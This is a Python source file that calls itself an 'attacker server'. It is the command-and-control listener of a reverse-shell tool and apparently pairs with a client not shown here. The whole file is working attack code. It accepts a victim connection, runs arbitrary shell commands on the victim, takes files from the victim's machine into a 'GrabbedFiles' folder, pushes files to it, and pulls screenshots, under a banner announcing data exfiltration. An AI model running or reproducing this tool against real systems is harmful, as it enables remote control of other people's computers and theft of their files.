# attacker server
#TCP
#Change directory
#TCP bi-directional data transfer

import os
import socket
import hashlib
from datetime import datetime as dt

ip = "0.0.0.0"
destinationPath = os.path.join(os.path.expanduser('~'), 'GrabbedFiles')
from common import port
from common import chunksize
from common import hashAlgorithm

# https://sqlpey.com/python/top-8-methods-to-hash-files-in-python/
def getFileHash(filePath):
    fileHash = hashlib.new(hashAlgorithm)
    with open(filePath, 'rb') as file:
        while chunk := file.read(fileHash.block_size):
            fileHash.update(chunk)
    return fileHash.hexdigest()

def receiveFile(mySocket, path):
    try:
        os.mkdir(destinationPath)
        print('Created destination folder')
    except FileExistsError:
        print('Destination folder exists')

    fileName = os.path.basename(path)
    destinationFile = os.path.join(destinationPath, fileName)
    print('Remote File Path =', path)
    print('Remote File Name =', fileName)
    print('Destination =', destinationFile)

    print('[+] Downloading file...')
    with open(destinationFile, 'wb') as file:
        # walrus operator to loop for as many packets
        while packet := mySocket.recv(chunksize):
            #print(packet)
            if packet.endswith('DONE'.encode()):
                file.write(packet[:-4])  # Write the last received packet without the word 'DONE'
                file.flush()
                print('[+] Transfer completed!')

                print('[+] Calculating file hash...')
                mySocket.send('READY'.encode())
                remoteFileHash = mySocket.recv(chunksize).decode()
                localFileHash = getFileHash(destinationFile)
                if remoteFileHash == localFileHash:
                    print('[+] File hashes match!')
                    print('[+] Success!')
                else:
                    print('[-] Warning! File hashes do not match')
                    print('[-] Remote File Hash:', remoteFileHash)
                    print('[-] Local File Hash:', localFileHash)
                break
            elif 'File not found'.encode() in packet:
                print ('[-] File not found')
                break
            elif 'ERROR'.encode() in packet:
                error = packet.decode().split('ERROR')[1:]
                print(error)
                break
            file.write(packet)

def doSend(mySocket, sourcePath, destinationPath, fileName):
    # For 'send' operation, open the file in the read mode
    # Read the file into packets and send them through mySocket object
    # After finished sending the whole file, send string 'DONE' to indicate the completion
    if os.path.exists(sourcePath + fileName):
        sourceFile = open(sourcePath + fileName, 'rb')
        packet = sourceFile.read(chunksize)
        while len(packet) >0:
            mySocket.send(packet)
            packet = sourceFile.read(chunksize)
        mySocket.send('DONE'.encode())
        print('[+] Transfer Completed')
    else:
        mySocket.send('File not found'.encode())
        print('[-] Unable to find the file')

def connect():
    initSocket = socket.socket()
    initSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    initSocket.bind((ip, port))
    initSocket.listen(1)
    print("=" * 60)
    print("TCP DATA INFILTRATION AND EXFILTRATION")
    print("=" * 60)
    print('[+] Listening for incoming TCP mySocketection on port', port)
    mySocket, clientAddress = initSocket.accept()
    print('[+] We got a mySocketection from', clientAddress)

    while True:
        print("=" * 60)
        command = input("Shell> ")
        commandList = command.split()

        if 'terminate' == commandList[0]:
            mySocket.send('terminate'.encode())
            break

        # Command format: grab <File Path>
        # Example: grab C:\Users\user\Desktop\file.txt
        elif 'grab' == commandList[0]:
            mySocket.send(command.encode())
            receiveFile(mySocket, path=' '.join(commandList[1:]))

        #command format: send*<destination path>*<File Name>
        #example: send*C:\Users\John\Desktop\*photo.jpeg
        #source file in Linux. Example: /root/Desktop
        elif 'send' in commandList[0]:
            sendCmd, destination, fileName = command.split("*")
            source = input("Source path: ")
            mySocket.send(command.encode())
            doSend(mySocket, source, destination, fileName)
        elif 'screencap' == commandList[0]:
            mySocket.send(command.encode())
            # just using path here for the name
            path = os.path.join('/NONEXISTANT-SCREENCAP', dt.now().isoformat())
            receiveFile(mySocket, path)
        else:
            mySocket.send(command.encode())
            print(mySocket.recv(chunksize).decode())

def main():
    connect()

main()
